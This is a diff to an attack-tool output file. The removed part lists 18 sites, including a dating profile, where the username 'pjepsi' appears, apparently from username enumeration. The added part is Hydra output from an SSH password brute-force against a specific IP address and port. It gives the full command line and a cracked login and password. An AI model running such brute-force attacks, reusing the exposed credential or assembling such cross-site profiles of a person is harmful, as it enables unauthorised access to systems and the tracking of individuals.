@@ -1,19 +1,11 @@
-https://create.arduino.cc/projecthub/pjepsi
-https://www.chess.com/member/pjepsi
-https://www.duolingo.com/profile/pjepsi
-https://www.facebook.com/pjepsi
-https://fortnitetracker.com/profile/all/pjepsi
-https://www.github.com/pjepsi
-https://www.instagram.com/pjepsi
-https://api.mojang.com/users/profiles/minecraft/pjepsi
-https://www.reddit.com/user/pjepsi
-https://www.roblox.com/user.aspx?username=pjepsi
-https://www.snapchat.com/add/pjepsi
-https://www.strava.com/athletes/pjepsi
-https://www.tinder.com/@pjepsi
-https://trashbox.ru/users/pjepsi
-https://www.twitch.tv/pjepsi
-https://twitter.com/pjepsi
-https://www.kooapp.com/profile/pjepsi
-https://www.zoomit.ir/user/pjepsi
-Total Websites Username Detected On : 18
+{ "generator": {
+	"software": "Hydra", "version": "v9.1", "built": "2023-01-30 13:28:00",
+	"server": "161.53.171.105", "service": "ssh", "jsonoutputversion": "1.00",
+	"commandline": "hydra -l pecelar22 -P ./lists/passList.txt -s 10001 -vV -o ./pjepsi.txt -b json 161.53.171.105 ssh"
+	},
+"results": [
+	{"port": 10001, "service": "ssh", "host": "161.53.171.105", "login": "pecelar22", "password": "petar22"}
+	],
+"success": false,
+"errormessages": [ "[ERROR] 10 targets did not resolve or could not be connected", "[ERROR] 0 target did not complete" ],
+"quantityfound": 1   }
